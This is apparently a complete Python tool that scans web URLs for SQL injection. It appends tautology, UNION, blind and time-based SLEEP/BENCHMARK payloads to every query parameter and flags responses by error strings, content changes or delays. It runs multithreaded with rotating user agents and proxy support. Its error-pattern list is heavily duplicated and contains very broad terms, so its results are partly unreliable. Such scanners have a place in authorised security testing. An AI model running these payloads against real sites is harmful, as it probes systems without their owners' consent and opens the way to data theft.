import argparse
import requests
import threading
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, init
from tqdm import tqdm
import sys
import random
import os

# Initialize colorama
init(autoreset=True)

# Expanded SQL error patterns to look for in the response
SQL_ERRORS = [
    "SQL syntax", "mysql_fetch_array", "Syntax error", "mysql_num_rows",
    "oracle.jdbc", "SQLException", "SQLServerException", "MySQL error",
    "You have an error in your SQL syntax", "Invalid query", "mysql_error",
    "SQLSTATE", "ODBC Driver", "Unclosed quotation mark", "pg_",
    "error at or near", "DB2 SQL error", "Microsoft SQL Server", "Error in SQL syntax",
    "ODBC", "SQL query failed", "SQL error", "SQL warning", "syntax error",
    "SQL", "mysql", "db error", "database error", "mysql_query", "ORA-", "DBMS",
    "SQLServer", "MySQLdb", "sqlsrv_", "SQLException", "Database connection",
    "Error in query", "Driver={SQL Server}", "Driver={PostgreSQL}",
    "Driver={MySQL}", "Driver={SQLite3}", "Driver={MongoDB}", "MySQL",
    "SQL Server", "Oracle", "PostgreSQL", "SQLite", "MongoDB", "JDBC",
    "DBI", "SQLSTATE[HY000]", "SQLSTATE[42000]", "SQLSTATE[42S02]",
    "SQLSTATE[42S22]", "SQLSTATE[23000]", "SQLSTATE[HY000]",
    "SQLSTATE[42000]", "SQLSTATE[42S02]", "SQLSTATE[42S22]",
    "SQLSTATE[23000]", "DB error", "SQL query", "ODBC Driver",
    "SQL Query Failed", "ODBC SQL", "Error Executing SQL", "SQL Failed",
    
    "mysql_fetch_assoc", "mysql_fetch_object", "mysqli_error", "mysqli_query",
    "Error Code", "SQL Error Code", "Syntax error near", "SQL Injection",
    "Incorrect integer value", "Cannot insert", "Data truncated for column",
    "Duplicate entry", "Unknown column", "Column count doesn't match",
    "Table doesn't exist", "Unknown table", "Invalid parameter number",
    "Invalid column name", "Invalid table name", "Invalid object name",
    "Server error", "Access denied", "Integrity constraint violation",
    "SQLSTATE[42000]: Syntax error or access violation", "SQLSTATE[HY000]: General error",
    "SQLSTATE[42S22]: Column not found", "SQLSTATE[42S22]: Column not found: 1054 Unknown column",
    "SQLSTATE[42S02]: Base table or view not found", "SQLSTATE[42S02]: Base table or view not found: 1146 Table",
    "SQLSTATE[23000]: Integrity constraint violation", "SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry",
    "SQLSTATE[HY000]: General error: 1364 Field", "SQLSTATE[HY000]: General error: 1048 Column",
    "SQLSTATE[HY000]: General error: 1064 You have an error in your SQL syntax", "SQLSTATE[42000]: Syntax error or access violation",
    "SQLSTATE[HY000]: General error: 2006 MySQL server has gone away", "SQLSTATE[HY000]: General error: 1205 Lock wait timeout",
    "SQLSTATE[42S22]: Column not found: 1054 Unknown column in 'field list'", "SQLSTATE[42S22]: Column not found: 1054 Unknown column",
    "SQLSTATE[42S01]: Base table or view already exists", "SQLSTATE[42S01]: Base table or view already exists: 1050 Table",
    "SQLSTATE[23000]: Integrity constraint violation: 1451 Cannot delete or update a parent row", "SQLSTATE[23000]: Integrity constraint violation: 1452 Cannot add or update a child row",
    "SQLSTATE[42000]: Syntax error or access violation: 1062 Duplicate entry", "SQLSTATE[42000]: Syntax error or access violation: 1055 Expression #1 of SELECT list is not in GROUP BY clause",
    "SQLSTATE[42000]: Syntax error or access violation: 1265 Data truncated for column", "SQLSTATE[42S01]: Base table or view already exists: 1050 Table",
    "SQLSTATE[42S22]: Column not found: 1054 Unknown column in 'field list'", "SQLSTATE[42S22]: Column not found: 1054 Unknown column",
    "SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry", "SQLSTATE[23000]: Integrity constraint violation: 1451 Cannot delete or update a parent row",
    "SQLSTATE[HY000]: General error: 1205 Lock wait timeout", "SQLSTATE[HY000]: General error: 2006 MySQL server has gone away",
    "SQLSTATE[42S01]: Base table or view already exists: 1050 Table", "SQLSTATE[42S01]: Base table or view already exists: 1060 Duplicate column name",
    "SQLSTATE[42000]: Syntax error or access violation: 1146 Table 'db.table' doesn't exist", "SQLSTATE[42S22]: Column not found: 1054 Unknown column in 'field list'",
    "SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry", "SQLSTATE[HY000]: General error: 1364 Field", "SQLSTATE[42000]: Syntax error or access violation: 1055 Expression #1 of SELECT list is not in GROUP BY clause",
    "SQLSTATE[42000]: Syntax error or access violation: 1265 Data truncated for column", "SQLSTATE[42S01]: Base table or view already exists: 1050 Table",
    "SQLSTATE[42S22]: Column not found: 1054 Unknown column", "SQLSTATE[23000]: Integrity constraint violation: 1451 Cannot delete or update a parent row",
    "SQLSTATE[23000]: Integrity constraint violation: 1452 Cannot add or update a child row", "SQLSTATE[42000]: Syntax error or access violation: 1062 Duplicate entry",
    "SQLSTATE[42000]: Syntax error or access violation: 1055 Expression #1 of SELECT list is not in GROUP BY clause", "SQLSTATE[42000]: Syntax error or access violation: 1265 Data truncated for column",
    "SQLSTATE[42S01]: Base table or view already exists: 1050 Table", "SQLSTATE[42S22]: Column not found: 1054 Unknown column in 'field list'",
    "SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry", "SQLSTATE[HY000]: General error: 1364 Field", "SQLSTATE[42000]: Syntax error or access violation: 1055 Expression #1 of SELECT list is not in GROUP BY clause",
    "SQLSTATE[42000]: Syntax error or access violation: 1265 Data truncated for column", "SQLSTATE[42S01]: Base table or view already exists: 1050 Table",
    "SQLSTATE[42S22]: Column not found: 1054 Unknown column", "SQLSTATE[23000]: Integrity constraint violation: 1451 Cannot delete or update a parent row",
    "SQLSTATE[23000]: Integrity constraint violation: 1452 Cannot add or update a child row", "SQLSTATE[42000]: Syntax error or access violation: 1062 Duplicate entry"
]

DEFAULT_INJECTION_CHARS = [
    "'", '"', "--", "#", "/*", "*/", "OR 1=1", "AND 1=1", "UNION SELECT", "SLEEP(5)", 
    "NULL", ">", "1=1", "AND 1=1", "OR 1=1", "1=1--", "1=1#", "'OR 1=1"
]

BLIND_INJECTION_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR 'x'='x", "' OR '1'='1' /*",
    "' AND 1=1", "' AND 1=2", "' AND (SELECT 1 FROM dual WHERE 1=1)"
]

TIME_BASED_PAYLOADS = [
    "' OR IF(1=1, SLEEP(5), 0)--", "' OR IF(1=2, SLEEP(5), 0)--",
    "' OR IF(1=1, BENCHMARK(1000000, MD5(1)), 0)--"
]

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Configure logging
logging.basicConfig(filename='sql_injection_detection.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def parse_arguments():
    parser = argparse.ArgumentParser(description="SQL Injection detection tool")
    parser.add_argument('-u', '--url', type=str, required=True, help="URL or file containing URLs")
    parser.add_argument('-t', '--threads', type=int, default=4, help="Number of threads for concurrent testing")
    parser.add_argument('--custom-errors', type=str, help="Comma-separated list of custom SQL error patterns")
    parser.add_argument('--user-agent', type=str, help="Custom User-Agent header")
    parser.add_argument('--retry', '-r', type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument('--timeout', type=int, default=10, help="Request timeout in seconds")
    parser.add_argument('--proxy', type=str, help="Proxy URL")
    parser.add_argument('--config', type=str, help="Configuration file path")
    parser.add_argument('--verbose', '-v', action='store_true', help="Enable verbose output")
    parser.add_argument('--injections', type=str, help="Comma-separated list of custom injection characters")
    parser.add_argument('--header', type=str, help="Custom header in format 'HeaderName: HeaderValue'")
    parser.add_argument('--time-based', type=str, nargs='?', const='', help="Comma-separated list of custom time-based payloads")
    parser.add_argument('--blind', type=str, nargs='?', const='', help="Comma-separated list of custom blind SQL payloads")
    return parser.parse_args()

def load_config(file_path):
    config = {}
    if file_path and os.path.exists(file_path):
        with open(file_path) as f:
            for line in f:
                key, value = line.strip().split('=', 1)
                config[key] = value
    return config

def parse_custom_headers(header_str):
    headers = {}
    if header_str:
        for header in header_str.split(','):
            key, value = header.split(':', 1)
            headers[key.strip()] = value.strip()
    return headers

def fetch_original_content(url, retry=3, timeout=10, proxies=None, headers=None):
    for _ in range(retry):
        try:
            response = requests.get(url, timeout=timeout, proxies=proxies, headers=headers)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            logging.error(f"Error fetching original content: {e}")
            time.sleep(random.uniform(1, 3))  # Exponential backoff
    return ""

def test_sql_injection(url, original_content, args):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    results = []
    sql_detected_urls = []
    headers = {'User-Agent': args.user_agent or random.choice(DEFAULT_USER_AGENTS)}
    if args.header:
        headers.update(parse_custom_headers(args.header))  # Add custom headers only if specified
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None

    # Determine injection payloads
    if args.blind is not None:
        all_injections = BLIND_INJECTION_PAYLOADS
    elif args.time_based is not None:
        all_injections = TIME_BASED_PAYLOADS
    else:
        all_injections = DEFAULT_INJECTION_CHARS

    total_chars = len(all_injections) * sum(len(v) for v in query_params.values())
    chars_done = 0
    char_progress_bar = tqdm(total=total_chars, desc='Characters Injected', unit='char', ncols=100)

    # Generate all possible URLs by injecting each character into all query parameters
    for char in all_injections:
        # Inject char into all parameters
        injected_params = {param: [value + char for value in values] for param, values in query_params.items()}
        test_query = urlencode(injected_params, doseq=True)
        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, test_query, parsed_url.fragment))

        for _ in range(args.retry):
            try:
                response = requests.get(test_url, timeout=args.timeout, proxies=proxies, headers=headers)
                content = response.text
                error_detected = any(error.lower() in content.lower() for error in SQL_ERRORS + (args.custom_errors.split(',') if args.custom_errors else []))
                content_changed = content != original_content
                blank_page = not content.strip()

                if error_detected:
                    status = "SQL Detected"
                    for error in SQL_ERRORS + (args.custom_errors.split(',') if args.custom_errors else []):
                        if error.lower() in content.lower():
                            status += f" - {error}"
                            break
                    if test_url not in sql_detected_urls:
                        sql_detected_urls.append(test_url)
                elif blank_page:
                    status = "SQL Detected - Blank Page"
                elif content_changed:
                    status = "Content Altered"
                else:
                    status = "SQL Not Detected"

                results.append((test_url, char, status))

                if args.verbose:
                    logging.info(f"URL: {test_url} - Status: {status}")

                # Update progress
                chars_done += len(char) * len(query_params)
                char_progress_bar.update(len(char) * len(query_params))
                sys.stdout.write(f"\r{Fore.CYAN}Testing: {test_url} with {char}")
                sys.stdout.flush()

                break
            except requests.RequestException as e:
                logging.error(f"Error testing URL {test_url} with char {char}: {e}")
                time.sleep(random.uniform(1, 3))  # Exponential backoff

    char_progress_bar.close()
    return results, sql_detected_urls

def blind_injection_testing(url, original_content, args):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    results = []
    headers = {'User-Agent': args.user_agent or random.choice(DEFAULT_USER_AGENTS)}
    if args.header:
        headers.update(parse_custom_headers(args.header))  # Add custom headers only if specified
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None

    # Testing for Blind SQL Injection
    custom_blind_payloads = args.blind.split(',') if args.blind else BLIND_INJECTION_PAYLOADS

    for payload in custom_blind_payloads:
        injected_params = {param: [value + payload for value in values] for param, values in query_params.items()}
        test_query = urlencode(injected_params, doseq=True)
        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, test_query, parsed_url.fragment))

        try:
            response = requests.get(test_url, timeout=args.timeout, proxies=proxies, headers=headers)
            content = response.text
            blank_page = not content.strip()
            content_changed = content != original_content

            if blank_page:
                status = "Blind SQL Injection Detected - Blank Page"
            elif content_changed:
                status = "Blind SQL Injection Detected - Content Altered"
            else:
                status = "Blind SQL Injection Not Detected"

            results.append((test_url, payload, status))
        except requests.RequestException as e:
            logging.error(f"Error during blind injection testing for URL {test_url}: {e}")

    return results

def time_based_testing(url, args):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    results = []
    headers = {'User-Agent': args.user_agent or random.choice(DEFAULT_USER_AGENTS)}
    if args.header:
        headers.update(parse_custom_headers(args.header))  # Add custom headers only if specified
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None

    # Testing for Time-Based SQL Injection
    custom_time_based_payloads = args.time_based.split(',') if args.time_based else TIME_BASED_PAYLOADS

    for payload in custom_time_based_payloads:
        injected_params = {param: [value + payload for value in values] for param, values in query_params.items()}
        test_query = urlencode(injected_params, doseq=True)
        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, test_query, parsed_url.fragment))

        start_time = time.time()
        try:
            response = requests.get(test_url, timeout=args.timeout, proxies=proxies, headers=headers)
            elapsed_time = time.time() - start_time
            if elapsed_time > 5:
                status = "Time-Based SQL Injection Detected"
            else:
                status = "Time-Based SQL Injection Not Detected"
            results.append((test_url, payload, status))
        except requests.RequestException as e:
            logging.error(f"Error during time-based testing for URL {test_url}: {e}")

    return results

def worker(url, original_content, args, results, sql_detected_urls, progress_bar):
    results_sql, sql_urls = test_sql_injection(url, original_content, args)
    results.extend(results_sql)
    sql_detected_urls.extend(sql_urls)

    if args.blind:
        results_blind = blind_injection_testing(url, original_content, args)
        results.extend(results_blind)

    if args.time_based:
        results_time_based = time_based_testing(url, args)
        results.extend(results_time_based)
    
    progress_bar.update(1)

def main():
    args = parse_arguments()
    config = load_config(args.config)

    # Set custom headers from configuration if specified
    headers = {}
    if args.header:
        headers.update(parse_custom_headers(args.header))

    headers.update({'User-Agent': args.user_agent or random.choice(DEFAULT_USER_AGENTS)})

    urls = []
    if os.path.isfile(args.url):
        with open(args.url) as f:
            urls = [line.strip() for line in f if line.strip()]
    else:
        urls = [args.url]

    total_urls = len(urls)
    print(f"{Fore.CYAN}Total URLs to be tested: {Fore.GREEN}{total_urls}")

    original_content = fetch_original_content(urls[0], retry=args.retry, timeout=args.timeout, proxies={'http': args.proxy, 'https': args.proxy} if args.proxy else None, headers=headers)

    results = []
    sql_detected_urls = []
    progress_bar = tqdm(total=total_urls, desc='Testing URLs', unit='request', ncols=100)

    threads = []
    start_time = time.time()

    for url in urls:
        thread = threading.Thread(target=worker, args=(url, original_content, args, results, sql_detected_urls, progress_bar))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    progress_bar.close()
    end_time = time.time()
    total_time = end_time - start_time
    print(f"\n{Fore.CYAN}Execution completed in {total_time:.2f} seconds")

    sql_detected_count = sum(1 for _, _, status in results if "SQL Detected" in status)
    blank_or_unusual_count = sum(1 for _, _, status in results if "Blank Page Detected" in status or "Content Altered" in status)

    print(f"\n{Fore.MAGENTA}--------------------------------------------------")
    print(f"{Fore.MAGENTA}All URLs Tested:")
    for result in results:
        injected_url, char, status = result
        print(f"{Fore.CYAN}--------------------------------------------------")
        print(f"{Fore.WHITE}URL: {injected_url}")
        print(f"{Fore.YELLOW}Injection Character: {char}")
        print(f"{Fore.RED}SQL Status: {status}")
        print(f"{Fore.CYAN}--------------------------------------------------")
    print(f"{Fore.MAGENTA}--------------------------------------------------")

    print(f"{Fore.MAGENTA}Total URLs Tested: {Fore.GREEN}{len(results)}")
    print(f"{Fore.MAGENTA}Total URLs with SQL Injection Detected: {Fore.RED}{sql_detected_count}")
    print(f"{Fore.MAGENTA}Total URLs with Blank or Unusual Behavior: {Fore.RED}{blank_or_unusual_count}")

    if sql_detected_urls:
        print(f"\n{Fore.MAGENTA}--------------------------------------------------")
        print(f"{Fore.MAGENTA}URLs with SQL Injection Detected:")
        for url in sql_detected_urls:
            print(f"{Fore.RED}{url}")
        print(f"{Fore.MAGENTA}--------------------------------------------------")

    with open('summary_report.txt', 'w') as f:
        f.write(f"Total URLs Tested: {len(results)}\n")
        f.write(f"Total URLs with SQL Injection Detected: {sql_detected_count}\n")
        f.write(f"Total URLs with Blank or Unusual Behavior: {blank_or_unusual_count}\n")
        f.write("\nDetails:\n")
        for result in results:
            injected_url, char, status = result
            f.write(f"URL: {injected_url}\n")
            f.write(f"Injection Character: {char}\n")
            f.write(f"SQL Status: {status}\n")
            f.write(f"--------------------------------------------------\n")
        f.write("\nURLs with SQL Injection Detected:\n")
        for url in sql_detected_urls:
            f.write(f"{url}\n")

if __name__ == "__main__":
    main()
